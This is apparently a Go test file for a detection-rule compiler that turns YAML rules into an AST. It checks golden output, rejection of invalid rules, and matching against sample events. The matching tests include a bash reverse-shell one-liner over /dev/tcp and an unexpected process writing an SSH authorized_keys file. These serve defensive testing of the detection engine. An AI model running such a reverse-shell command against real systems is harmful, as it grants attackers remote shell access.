package ruleast

import (
	"bytes"
	"encoding/json"
	"errors"
	"flag"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

// updateGolden rewrites golden fixtures when set. Run with
// `go test -run Golden -update` to accept AST changes after touching the
// compiler — then inspect the diff before committing.
var updateGolden = flag.Bool("update", false, "rewrite golden files from current output")

func TestCompileGolden(t *testing.T) {
	rulesDir := "testdata/rules"
	goldenDir := "testdata/golden"

	entries, err := os.ReadDir(rulesDir)
	if err != nil {
		t.Fatalf("read rules dir: %v", err)
	}

	var ymls []string
	for _, e := range entries {
		if !e.IsDir() && strings.HasSuffix(e.Name(), ".yml") {
			ymls = append(ymls, e.Name())
		}
	}
	sort.Strings(ymls)
	if len(ymls) < 20 {
		t.Fatalf("expected >=20 rule fixtures; have %d", len(ymls))
	}

	for _, name := range ymls {
		name := name
		t.Run(name, func(t *testing.T) {
			src, err := os.ReadFile(filepath.Join(rulesDir, name))
			if err != nil {
				t.Fatalf("read rule: %v", err)
			}
			art, _, _, err := Compile(src)
			if err != nil {
				t.Fatalf("compile: %v", err)
			}
			got, err := json.MarshalIndent(ruleGolden(art.Rule), "", "  ")
			if err != nil {
				t.Fatalf("marshal: %v", err)
			}
			got = append(got, '\n')

			goldenPath := filepath.Join(goldenDir, strings.TrimSuffix(name, ".yml")+".json")
			if *updateGolden {
				if wErr := os.WriteFile(goldenPath, got, 0o600); wErr != nil {
					t.Fatalf("write golden: %v", wErr)
				}
				return
			}
			want, err := os.ReadFile(goldenPath)
			if err != nil {
				t.Fatalf("read golden (run with -update to create): %v", err)
			}
			if !bytes.Equal(got, want) {
				t.Errorf("golden mismatch for %s\n--- want\n%s\n--- got\n%s", name, want, got)
			}
		})
	}
}

func TestCompileRejectsInvalid(t *testing.T) {
	cases := []struct {
		file     string
		contains string
	}{
		{"bad-product.yml", "product"},
		{"bad-category.yml", "category"},
		{"bad-modifier.yml", "modifier"},
		{"missing-condition.yml", "condition"},
		{"unknown-selection.yml", "unknown selection"},
		{"wildcard-form.yml", "Phase 1"},
		{"timeframe.yml", "timeframe"},
		{"bad-regex.yml", "regex"},
		{"list-selection.yml", "list-of-maps"},
		{"missing-id.yml", "id required"},
		{"empty-condition.yml", "end of condition"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.file, func(t *testing.T) {
			src, err := os.ReadFile(filepath.Join("testdata", "invalid", c.file))
			if err != nil {
				t.Fatalf("read: %v", err)
			}
			_, _, _, err = Compile(src)
			if err == nil {
				t.Fatalf("expected error, got nil")
			}
			if !errors.Is(err, ErrCompile) {
				t.Errorf("error does not wrap ErrCompile: %v", err)
			}
			if !strings.Contains(err.Error(), c.contains) {
				t.Errorf("error %q does not contain %q", err.Error(), c.contains)
			}
		})
	}
}

// mapEnv is a small Env implementation backing Match tests with a literal
// map — avoids pulling an OCSF event into the pkg tests.
type mapEnv map[string][]string

func (m mapEnv) Lookup(field string) ([]string, bool) {
	v, ok := m[field]
	return v, ok
}

func TestMatchSimpleAnd(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/01-reverse-shell-bash.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatalf("compile: %v", err)
	}
	rule := art.Rule

	hit := mapEnv{
		"Image":       {"/bin/bash"},
		"CommandLine": {"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
	}
	if !rule.Match(hit) {
		t.Errorf("rule should match reverse-shell-style command")
	}

	miss := mapEnv{
		"Image":       {"/bin/ls"},
		"CommandLine": {"ls -la"},
	}
	if rule.Match(miss) {
		t.Errorf("rule should not match /bin/ls")
	}
}

func TestMatchNotOperator(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/11-authorized-keys-write.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule

	// sshd touching authorized_keys — benign branch, rule should NOT match.
	benign := mapEnv{
		"TargetFilename": {"/home/alice/.ssh/authorized_keys"},
		"Image":          {"/usr/sbin/sshd"},
	}
	if rule.Match(benign) {
		t.Errorf("sshd write should be filtered out by 'not benign'")
	}

	// Anything else touching the same file — should match.
	attacker := mapEnv{
		"TargetFilename": {"/home/alice/.ssh/authorized_keys"},
		"Image":          {"/tmp/payload"},
	}
	if !rule.Match(attacker) {
		t.Errorf("non-sshd writer should trigger")
	}
}

func TestMatchRegex(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/22-regex-only.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	if !rule.Match(mapEnv{"CommandLine": {"curl 1.2.3.4"}}) {
		t.Errorf("regex should match IP literal")
	}
	if rule.Match(mapEnv{"CommandLine": {"echo hello"}}) {
		t.Errorf("regex should not match plain text")
	}
}

func TestMatchNestedParens(t *testing.T) {
	src, err := os.ReadFile("testdata/rules/21-proc-nested-parens.yml")
	if err != nil {
		t.Fatal(err)
	}
	art, _, _, err := Compile(src)
	if err != nil {
		t.Fatal(err)
	}
	rule := art.Rule
	// (a AND (b OR c)) AND NOT d
	cases := []struct {
		env  mapEnv
		want bool
	}{
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"curl http://x"}, "User": {"alice"}}, true},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"wget http://x"}, "User": {"alice"}}, true},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"echo x"}, "User": {"alice"}}, false},
		{mapEnv{"Image": {"/bin/sh"}, "CommandLine": {"curl x"}, "User": {"root"}}, false},
		{mapEnv{"Image": {"/usr/bin/ls"}, "CommandLine": {"curl x"}, "User": {"alice"}}, false},
	}
	for i, c := range cases {
		if got := rule.Match(c.env); got != c.want {
			t.Errorf("case %d: got %v want %v (env=%v)", i, got, c.want, c.env)
		}
	}
}

func TestCostOrdering(t *testing.T) {
	simpleArt, _, _, err := Compile(readRule(t, "testdata/rules/05-find-suid.yml"))
	if err != nil {
		t.Fatal(err)
	}
	complexArt, _, _, err := Compile(readRule(t, "testdata/rules/21-proc-nested-parens.yml"))
	if err != nil {
		t.Fatal(err)
	}
	simple := simpleArt.Rule
	complexRule := complexArt.Rule
	if simple.Cost() >= complexRule.Cost() {
		t.Errorf("simple rule cost %d should be less than complex rule cost %d", simple.Cost(), complexRule.Cost())
	}
}

func readRule(t *testing.T, path string) []byte {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// ruleGolden projects a *Rule into a stable map for golden comparison.
// Selections are emitted in sorted-key order so YAML-map nondeterminism
// can't perturb the output.
func ruleGolden(r *Rule) map[string]any {
	out := map[string]any{
		"id":          r.ID,
		"title":       r.Title,
		"description": r.Description,
		"level":       string(r.Level),
		"category":    string(r.Category),
		"cost":        r.Cost(),
		"condition":   r.Condition.String(),
	}
	if len(r.Tags) > 0 {
		tags := make([]string, len(r.Tags))
		copy(tags, r.Tags)
		sort.Strings(tags)
		out["tags"] = tags
	}

	names := make([]string, 0, len(r.Selections))
	for name := range r.Selections {
		names = append(names, name)
	}
	sort.Strings(names)

	sels := make([]any, 0, len(names))
	for _, name := range names {
		sel := r.Selections[name]
		fields := make([]any, 0, len(sel.Fields))
		for i := range sel.Fields {
			fp := sel.Fields[i]
			fields = append(fields, map[string]any{
				"field":  fp.Field,
				"op":     fp.Op.String(),
				"values": fp.Values,
			})
		}
		sort.SliceStable(fields, func(i, j int) bool {
			a := fields[i].(map[string]any)
			b := fields[j].(map[string]any)
			if a["field"].(string) != b["field"].(string) {
				return a["field"].(string) < b["field"].(string)
			}
			return a["op"].(string) < b["op"].(string)
		})
		sels = append(sels, map[string]any{
			"name":   name,
			"fields": fields,
		})
	}
	out["selections"] = sels
	return out
}
